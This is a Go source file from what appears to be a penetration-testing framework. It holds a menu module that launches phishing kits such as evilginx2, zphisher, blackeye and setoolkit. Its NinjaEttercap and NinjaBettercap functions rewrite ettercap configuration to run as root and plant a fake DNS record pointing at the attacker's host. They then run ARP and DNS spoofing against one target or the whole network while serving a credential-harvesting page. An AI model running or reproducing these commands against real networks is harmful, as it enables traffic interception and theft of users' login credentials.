//John 3:16

package phishers

import(
    "os"
    "fmt"
    "utils"
    "menus"
    "banners"
    "strings"
    "bcolors"
    "strconv"
    "scriptures"
    "subprocess"
)

var (
    Function string
)

var defaultValues = map[string]string{

    "function": "",
    "rhost":    utils.RHost,
    "target":   utils.RHost,
    "lhost":    utils.LHost,
    "iface":    utils.IFace,
    "lport":    utils.LPort,
    "spoofer":  utils.Spoofer,
    "name":     utils.BeefName,
    "password": utils.BeefPass,
    "fakedns":  utils.PhFakeDns,
    "output":   utils.OutPutDir,
}

type stringMatcher struct {
    names  []string
    action func()
}

func PhishingPentest() {
    for {
        fmt.Printf("%s%s%safr%s%s phishers(%s%ssrc/pentest_%s.fn%s)%s > %s", bcolors.Endc, bcolors.Underline, bcolors.Bold, subprocess.Version, bcolors.Endc, bcolors.Bold, bcolors.BrightRed, Function, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        utils.Scanner.Scan()
        Input := strings.TrimSpace(utils.Scanner.Text())
        buildParts := strings.Fields(strings.ToLower(Input))
        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(Input) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeFunction()
        default:
            utils.SystemShell(Input)
        }
    }
}

func executeCommand(cmd string) bool {
    commandGroups := []stringMatcher{

        {[]string{"? info", "h info", "help info"}, menus.HelpInfo},
        {[]string{"v", "version"}, banners.Version},
        {[]string{"s", "sleep"}, utils.Sleep},
        {[]string{"c", "cls", "clear", "cls screen", "clear screen", "screen cls", "screen clear"}, utils.ClearScreen},

        {[]string{"histo", "history", "show history", "log", "logs", "show log", "show logs"}, subprocess.ShowHistory},
        {[]string{"c junk", "c junks", "c output", "c outputs", "clear junk", "clear junks", "clear output", "clear outputs"}, utils.ClearJunks},
        {[]string{"c log", "c logs", "c history", "c histories", "clear log", "clear logs", "clear history", "clear histories"}, subprocess.ClearHistory},
        {[]string{"junk", "junks", "output", "outputs", "show junk", "show junks", "show output", "show outputs", "l junk", "l junks", "l output", "l outputs", "list junk", "list junks", "list output", "list outputs"}, utils.ListJunks},

        {[]string{"? run", "h run", "info run", "help run", "? exec", "h exec", "info exec", "help exec", "? launch", "h launch", "info launch", "help launch", "? exploit", "h exploit", "info exploit", "help exploit", "? execute", "h execute", "info execute", "help execute"}, menus.HelpInfoRun},

        {[]string{"set", "h set", "info set", "help set"}, menus.HelpInfoSet},
        {[]string{"use", "? use", "h use", "info use", "help use"}, menus.HelpInfoUse},

        {[]string{"tips", "h tips", "? tips", "info tips", "help tips"}, menus.HelpInfoTips},
        {[]string{"show", "? show", "h show", "info show", "help show"}, menus.HelpInfoShow},
        {[]string{"info list", "help list", "use list", "list"}, menus.HelpInfoList},
        {[]string{"h option", "? option", "h options", "? options", "info option", "help option", "info options", "help options"}, menus.HelpInfOptions},
        {[]string{"banner"}, banners.RandomBanners},
        {[]string{"g", "t", "guide", "tutarial"}, utils.BrowseTutorials},
        {[]string{"h", "?", "00", "help"}, menus.HelpInfoMenuZero},
        {[]string{"f", "use f", "features", "use features"}, menus.HelpInfoFeatures},

        {[]string{"info"}, menus.HelpInfoPhishers},
        {[]string{"m", "menu"}, menus.MenuSeven},
        {[]string{"option", "options", "show option", "show options"}, func() {menus.PhishersOptions(utils.PhMode, utils.RHost, utils.Proxies)}},
        {[]string{"func", "funcs", "functions", "show func", "list funcs", "show funcs", "show function", "list function", "list functions", "show functions", "module", "modules", "list module", "show module", "list modules", "show modules", "show all", "list all"}, menus.ListPhishersFunctions},

        {[]string{"1", "run 1", "use 1", "exec 1", "start 1", "launch 1", "exploit 1", "execute 1", "run gophish", "use gophish", "exec gophish", "start gophish", "launch gophish", "exploit gophish", "execute gophish"}, func() {PhishingPenFunctions("gophish")}},
        {[]string{"? 1", "info 1", "help 1", "gophish", "info gophish", "help gophish"}, menus.HelpInfoGoPhish},

        {[]string{"2", "run 2", "use 2", "exec 2", "start 2", "launch 2", "exploit 2", "execute 2", "run goodginx", "use goodginx", "exec goodginx", "start goodginx", "launch goodginx", "exploit goodginx", "execute goodginx"}, func() {PhishingPenFunctions("goodginx")}},
        {[]string{"? 2", "info 2", "help 2", "goodginx", "info goodginx", "help goodginx"}, menus.HelpInfoGoodGinx},

        {[]string{"3", "run 3", "use 3", "exec 3", "start 3", "launch 3", "exploit 3", "execute 3", "run zphisher", "use zphisher", "exec zphisher", "start zphisher", "launch zphisher", "exploit zphisher", "execute zphisher"}, func() {PhishingPenFunctions("zphisher")}},
        {[]string{"? 3", "info 3", "help 3", "zphisher", "info zphisher", "help zphisher"}, menus.HelpInfoZPhisher},

        {[]string{"4", "run 4", "use 4", "exec 4", "start 4", "launch 4", "exploit 4", "execute 4", "run blackeye", "use blackeye", "exec blackeye", "start blackeye", "launch blackeye", "exploit blackeye", "execute blackeye"}, func() {PhishingPenFunctions("blackeye")}},
        {[]string{"? 4", "info 4", "help 4", "blackeye", "info blackeye", "help blackeye"}, menus.HelpInfoBlackEye},

        {[]string{"5", "run 5", "use 5", "exec 5", "start 5", "launch 5", "exploit 5", "execute 5", "run advphish", "use advphish", "exec advphish", "start advphish", "launch advphish", "exploit advphish", "execute advphish"}, func() {PhishingPenFunctions("advphish")}},
        {[]string{"? 5", "info 5", "help 5", "advphish", "info advphish", "help advphish"}, menus.HelpInfoAdvPhisher},

        {[]string{"6", "run 6", "use 6", "exec 6", "start 6", "launch 6", "exploit 6", "execute 6", "run darkphish", "use darkphish", "exec darkphish", "start darkphish", "launch darkphish", "exploit darkphish", "execute darkphish"}, func() {PhishingPenFunctions("darkphish")}},
        {[]string{"? 6", "info 6", "help 6", "darkphish", "info darkphish", "help darkphish"}, menus.HelpInfoDarkPhish},

        {[]string{"7", "run 7", "use 7", "exec 7", "start 7", "launch 7", "exploit 7", "execute 7", "run shellphish", "use shellphish", "exec shellphish", "start shellphish", "launch shellphish", "exploit shellphish", "execute shellphish"}, func() {PhishingPenFunctions("shellphish")}},
        {[]string{"? 7", "info 7", "help 7", "shellphish", "info shellphish", "help shellphish"}, menus.HelpInfoShellPhish},

        {[]string{"8", "run 8", "use 8", "exec 8", "start 8", "launch 8", "exploit 8", "execute 8", "run setoolkit", "use setoolkit", "exec setoolkit", "start setoolkit", "launch setoolkit", "exploit setoolkit", "execute setoolkit"}, func() {PhishingPenFunctions("setoolkit")}},
        {[]string{"? 8", "info 8", "help 8", "setoolkit", "info setoolkit", "help setoolkit"}, menus.HelpInfoSetoolKit},

        {[]string{"9", "run 9", "use 9", "exec 9", "start 9", "launch 9", "exploit 9", "execute 9", "run thc", "use thc", "exec thc", "start thc", "launch thc", "exploit thc", "execute thc"}, func() {PhishingPenFunctions("thc")}},
        {[]string{"? 9", "info 9", "help 9", "thc", "info thc", "help thc"}, menus.HelpInfoThc},

        {[]string{"10", "run 10", "use 10", "exec 10", "start 10", "launch 10", "exploit 10", "execute 10", "run verses", "use verses", "exec verses", "start verses", "launch verses", "exploit verses", "execute verses"}, scriptures.ScriptureNarrators},
        {[]string{"? 10", "verses", "info 10", "help 10", "info verses", "help verses"}, menus.HelpInfoVerses},
    }

    cmdLower := strings.ToLower(cmd)
    for _, group := range commandGroups {
        for _, name := range group.names {
            if name == cmdLower {
                group.action()
                return true
            }
        }
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], parts[2]
    setValues := map[string]*string{
      "func": &Function,
      "funcs": &Function,
      "module": &Function,
      "ssid": &utils.Ssid,
      "mode": &utils.NeMode,
      "function": &Function,
      "lhost": &utils.LHost,
      "lport": &utils.LPort,
      "hport": &utils.HPort,
      "rhost": &utils.RHost,
      "rhosts": &utils.RHost,
      "functions": &Function,
      "target": &utils.RHost,
      "distro": &utils.Distro,
      "targets": &utils.RHost,
      "proxy": &utils.Proxies,
      "script": &utils.Script,
       "name": &utils.BeefName,
      "build": &utils.BuildName,
      "proxies": &utils.Proxies,
      "passwd": &utils.BeefPass,
      "gateway": &utils.Gateway,
      "fakedns": &utils.FakeDns,
      "spoofer": &utils.Spoofer,
      "toolsdir": &utils.ToolsDir,
      "ddosmode": &utils.DDosMode,
      "recondir": &utils.ReconDir,
      "password": &utils.PassWord,
      "protocol": &utils.Protocol,
      "listener": &utils.Listener,
      "wordlist": &utils.WordsList,
      "listeners": &utils.Listener,
      "pyenvname": &utils.PyEnvName,
      "innericon": &utils.InnerIcon,
      "outericon": &utils.OuterIcon,
      "buildname": &utils.BuildName,
      "obfuscator": &utils.Obfuscator,

      "output": &utils.PhishersLogs,
      "outputlog": &utils.PhishersLogs,
      "outputlogs": &utils.PhishersLogs,
    }

    validKeys := make([]string, 0, len(setValues))
    for k := range setValues {
        validKeys = append(validKeys, k)
    }

    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s%s%s -> %s\n", bcolors.Cyan, strings.ToUpper(key), bcolors.Endc, value)
        return
    }

    var suggestions []string
    lowerInput := strings.ToLower(key)
    for _, cmd := range validKeys {
        lowerCmd := strings.ToLower(cmd)
        if strings.HasPrefix(lowerCmd, lowerInput) || strings.Contains(lowerCmd, lowerInput) || utils.Levenshtein(lowerInput, lowerCmd) <= 2 {
            suggestions = append(suggestions, cmd)
        }
    }

    if len(suggestions) > 0 {
        fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Did you mean one of these?%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)

        maxWidth := 0
        for _, s := range suggestions {
            if len(s) > maxWidth {
                maxWidth = len(s)
            }
        }
        maxWidth += 3

        cols := 5
        if len(suggestions) < cols {
            cols = len(suggestions)
        }

        for i := 0; i < len(suggestions); i += cols {
            for j := 0; j < cols && i+j < len(suggestions); j++ {
                fmt.Printf(" - %s%-*s%s", bcolors.Green, maxWidth, suggestions[i+j], bcolors.Endc)
            }
            fmt.Println()
        }

        return
    }

    fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Available keys:%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)
    maxWidth := 0
    for _, k := range validKeys {
        if len(k) > maxWidth {
            maxWidth = len(k)
        }
    }
    maxWidth += 3

    cols := 5
    for i := 0; i < len(validKeys); i += cols {
        for j := 0; j < cols && i+j < len(validKeys); j++ {
            fmt.Printf(" - %s%-*s%s", bcolors.Green, maxWidth, validKeys[i+j], bcolors.Endc)
        }
        fmt.Println()
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{
      "func": &Function,
      "funcs": &Function,
      "module": &Function,
      "ssid": &utils.Ssid,
      "mode": &utils.NeMode,
      "function": &Function,
      "lhost": &utils.LHost,
      "lport": &utils.LPort,
      "hport": &utils.HPort,
      "rhost": &utils.RHost,
      "rhosts": &utils.RHost,
      "functions": &Function,
      "target": &utils.RHost,
      "distro": &utils.Distro,
      "targets": &utils.RHost,
      "proxy": &utils.Proxies,
      "script": &utils.Script,
       "name": &utils.BeefName,
      "build": &utils.BuildName,
      "proxies": &utils.Proxies,
      "passwd": &utils.BeefPass,
      "gateway": &utils.Gateway,
      "fakedns": &utils.FakeDns,
      "spoofer": &utils.Spoofer,
      "toolsdir": &utils.ToolsDir,
      "ddosmode": &utils.DDosMode,
      "recondir": &utils.ReconDir,
      "password": &utils.PassWord,
      "protocol": &utils.Protocol,
      "listener": &utils.Listener,
      "wordlist": &utils.WordsList,
      "listeners": &utils.Listener,
      "pyenvname": &utils.PyEnvName,
      "innericon": &utils.InnerIcon,
      "outericon": &utils.OuterIcon,
      "buildname": &utils.BuildName,
      "obfuscator": &utils.Obfuscator,

      "output": &utils.PhishersLogs,
      "outputlog": &utils.PhishersLogs,
      "outputlogs": &utils.PhishersLogs,
    }

    validKeys := make([]string, 0, len(unsetValues))
    for k := range unsetValues {
        validKeys = append(validKeys, k)
    }

    if ptr, exists := unsetValues[key]; exists {
        *ptr = defaultValues[key]
        fmt.Printf("%s -> %s\n", strings.ToUpper(key), "Null")
        return
    }

    var suggestions []string
    lowerInput := strings.ToLower(key)
    for _, cmd := range validKeys {
        lowerCmd := strings.ToLower(cmd)
        if strings.HasPrefix(lowerCmd, lowerInput) || strings.Contains(lowerCmd, lowerInput) || utils.Levenshtein(lowerInput, lowerCmd) <= 2 {
            suggestions = append(suggestions, cmd)
        }
    }

    if len(suggestions) > 0 {
        fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Did you mean one of these?%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)

        maxWidth := 0
        for _, s := range suggestions {
            if len(s) > maxWidth {
                maxWidth = len(s)
            }
        }
        maxWidth += 3

        cols := 5
        if len(suggestions) < cols {
            cols = len(suggestions)
        }
        
        for i := 0; i < len(suggestions); i += cols {
            for j := 0; j < cols && i+j < len(suggestions); j++ {
                fmt.Printf(" - %s%-*s%s", bcolors.Green, maxWidth, suggestions[i+j], bcolors.Endc)
            }
            fmt.Println()
        }

        return
    }

    fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Available keys:%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)

    maxWidth := 0
    for _, k := range validKeys {
        if len(k) > maxWidth {
            maxWidth = len(k)
        }
    }
    maxWidth += 3

    cols := 5
    for i := 0; i < len(validKeys); i += cols {
        for j := 0; j < cols && i+j < len(validKeys); j++ {
            fmt.Printf(" - %s%-*s%s", bcolors.Green, maxWidth, validKeys[i+j], bcolors.Endc)
        }
        fmt.Println()
    }
}

func executeFunction() { 
    if Function == ""{
        fmt.Printf("\n%s[!] %sNo MODULE was set. Use %s'show modules' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    PhishingPenFunctions(Function)
}

func PhishingPenFunctions(Function string, args ...interface{}) {
    if utils.Proxies != "" {
        menus.PrintSelected(menus.PrintOptions{
            MODE: utils.PhMode,
            IFACE: utils.IFace,
            LPORT: utils.LPort,
            HPORT: utils.HPort,
            RHOST: utils.RHost,
            LHOST: utils.LHost,
            //DISTRO: utils.Distro,
            //SCRIPT: utils.Script,
            OUTPUTLOGS: utils.PhishersLogs,
            PROXIES: utils.Proxies,
            FUNCTION: Function,
            //RECONDIR: utils.ReconDir,
            //LISTENER: utils.Listener,
            //PROTOCOL: utils.Protocol,
            //TOOLSDIR: utils.ToolsDir,
            //INNERICON: utils.InnerIcon,
            //OUTERICON: utils.OuterIcon,
            //BUILDNAME: utils.BuildName,
            //OBFUSCATOR: utils.Obfuscator,
        }, true, true)

        if err := utils.SetProxy(utils.Proxies); err != nil {
            //
        }
    } else {
        menus.PrintSelected(menus.PrintOptions{
            MODE: utils.PhMode,
            IFACE: utils.IFace,
            LPORT: utils.LPort,
            HPORT: utils.HPort,
            RHOST: utils.RHost,
            LHOST: utils.LHost,
            //DISTRO: utils.Distro,
            SCRIPT: utils.Script,
            OUTPUTLOGS: utils.PhishersLogs,
            FUNCTION: Function,
            //RECONDIR: utils.ReconDir,
            //LISTENER: utils.Listener,
            //PROTOCOL: utils.Protocol,
            //TOOLSDIR: utils.ToolsDir,
            //INNERICON: utils.InnerIcon,
            //OUTERICON: utils.OuterIcon,
            //BUILDNAME: utils.BuildName,
            //OBFUSCATOR: utils.Obfuscator,
        }, true, true)
    }

    commands := map[string]func(){
        "gophish": func() {GoPhish()},
        "goodginx": func() {GoodGinx()},
        "zphisher": func() {ZPhisher()},
        "blackeye": func() {BlackEye()},
        "advphish": func() {AdvPhisher()},
        "darkphish": func() {DarkPhish()},
        "shellphish": func() {ShellPhish()},
        "setoolkit": func() {SetoolKit()},
        "thc": func() {Thc()},
        "thehackerchoice": func() {Thc()},

        "1": func() {GoPhish()},
        "2": func() {GoodGinx()},
        "3": func() {ZPhisher()},
        "4": func() {BlackEye()},
        "5": func() {AdvPhisher()},
        "6": func() {DarkPhish()},
        "7": func() {ShellPhish()},
        "8": func() {SetoolKit()},
        "9": func() {Thc()},
    }

    textCommands := []string{"gophish", "goodginx", "zphisher", "blackeye", "advphish", "darkPhish", "shellphish", "setoolkit", "thc", "thehackerchoice"}

    if action, exists := commands[Function]; exists {
        action()
        return
    }

    if num, err := strconv.Atoi(Function); err == nil {
        fmt.Printf("%s[!] %sNumber %s%d%s is invalid. Valid numbers are 1-10.\n", bcolors.Yellow, bcolors.Endc, bcolors.Red, num, bcolors.Endc)
        menus.ListPhishersFunctions()
        return
    }

    lowerInput := strings.ToLower(Function)
    for _, cmd := range textCommands {
        lowerCmd := strings.ToLower(cmd)
        if strings.HasPrefix(lowerCmd, lowerInput) || strings.Contains(lowerCmd, lowerInput) || utils.Levenshtein(lowerInput, lowerCmd) <= 2 {
            fmt.Printf("%s[!] %sFunction '%s%s%s' is invalid. Did you mean %s'%s'%s?\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, Function, bcolors.Endc, bcolors.Green, cmd, bcolors.Endc)
            return
        }
    }

    fmt.Printf("\n%s[!] %sModule '%s' is invalid. Available commands:\n", bcolors.Yellow, bcolors.Endc, Function)
    menus.ListPhishersFunctions()
}

func GoPhish() {
    subprocess.Run(`gophish`)
}

func GoodGinx() {
    subprocess.Run(`evilginx2`)
}

func Thc() {
    subprocess.Run(`cd %s/thc/; bash ./thc.sh`, utils.PhishersTools)
}

func SetoolKit() {
    subprocess.Run(`cd %s/set/; %s ./setoolkit`, utils.PhishersTools, utils.VenvPython)
}

func ZPhisher() {
    subprocess.Run(`cd %s/zphisher/; bash ./zphisher.sh`, utils.PhishersTools)
}

func BlackEye() {
    subprocess.Run(`cd %s/blackeye/; bash ./blackeye.sh`, utils.PhishersTools)
}

func ShellPhish() {
    subprocess.Run(`cd %s/shellphish/; bash ./shellphish.sh`, utils.PhishersTools)
}

func DarkPhish() {
    subprocess.Run(`cd %s/darkphish/; %s ./dark-phish.py`, utils.PhishersTools, utils.VenvPython)
}

func AdvPhisher() {
    subprocess.Run(`cd %s/advphishing/; bash ./advphishing.sh`, utils.PhishersTools)
}

func CyberPhish() {
    subprocess.Run(`cd %s/cyberphish/; %s ./cyberphish.py`, utils.PhishersTools, utils.VenvPython)
}

func NinjaEttercap(LHost, Gateway, PhFakeDns, RHost, IFace, Target string) {
    switch strings.ToLower(Target) {
    case "one":
        filePathO := "/etc/ettercap/etter.conf.bak_africana"
        if _, err := os.Stat(filePathO); os.IsNotExist(err) {
            subprocess.Run(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.conf": {
                    `ec_uid = 65534`: `ec_uid = 0`,
                    `ec_gid = 65534`: `ec_gid = 0`,
                    `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                    `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                    `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                    `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                },
            }
        utils.Editors(filesToReplacements)
        }
        filePathT := "/etc/ettercap/etter.dns.bak_africana"
        if _, err := os.Stat(filePathT); os.IsNotExist(err) {
            subprocess.Run(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
            newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n%s%s%s", utils.PhFakeDns, " A ", utils.LHost)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.dns": {
                    `# vim:ts=8:noexpandtab`: newString,
                 },
            }
        utils.Editors(filesToReplacements)
        }
        subprocess.Run(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof /%s// /%s//" &`, IFace, utils.RHost, Gateway)
        subprocess.Run(`cd %s/blackeye; bash ./blackeye.sh`, utils.PhishersTools)
        fmt.Println()
        subprocess.Run(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
        return

    case "all":
        filePathO := "/etc/ettercap/etter.conf.bak_africana"
        if _, err := os.Stat(filePathO); os.IsNotExist(err) {
            subprocess.Run(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.conf": {
                    `ec_uid = 65534`: `ec_uid = 0`,
                    `ec_gid = 65534`: `ec_gid = 0`,
                    `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                    `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                    `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                    `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                },
            }
        utils.Editors(filesToReplacements)
        }

        filePathT := "/etc/ettercap/etter.dns.bak_africana"
        if _, err := os.Stat(filePathT); os.IsNotExist(err) {
            subprocess.Run(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
            newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n%s%s%s", utils.PhFakeDns, " A ", utils.LHost)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.dns": {
                    `# vim:ts=8:noexpandtab`: newString,
                 },
            }
        utils.Editors(filesToReplacements)
        }

        fmt.Println()
        subprocess.Run(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof ///" &`, IFace)
        subprocess.Run(`cd %s/blackeye; bash ./blackeye.sh`, utils.PhishersTools)
        fmt.Println()
        subprocess.Run(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
        return

    default:
        fmt.Printf("\n%s[!] %sInvalid parameter TARGET. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Println()
}

func NinjaBettercap(LHost, Gateway, PhFakeDns, RHost, IFace, Target string) {
    if Target == ""{
        fmt.Printf("\n%s[!] %sMissing required parameter SPOOFER. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    switch strings.ToLower(Target) {
    case "one":
        subprocess.Run(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active'"&`, IFace, utils.RHost)
        subprocess.Run(`cd %s/blackeye; bash ./blackeye.sh`, utils.PhishersTools)
    case "all":
        subprocess.Run(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active'"&`, IFace)
        subprocess.Run(`cd %s/blackeye; bash ./blackeye.sh`, utils.PhishersTools)
    default:
        fmt.Printf("\n%s[!] %sMissing required parameter TARGET. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
}

func NinjaPhish(Spoofer, LHost, Gateway, PhFakeDns, RHost, IFace, Target string) {
    if utils.Spoofer == ""{
        fmt.Printf("\n%s[!] %sMissing required parameter SPOOFER. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    switch strings.ToLower(utils.Spoofer) {
    case "ettercap":
         NinjaEttercap(utils.LHost, Gateway, utils.PhFakeDns, utils.RHost, IFace, Target)
    case "bettercap":
         NinjaBettercap(utils.LHost, Gateway, utils.PhFakeDns, utils.RHost, IFace, Target)
    default:
        fmt.Printf("\n%s[!] %sMissing required parameter SPOOFER. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
     }
}
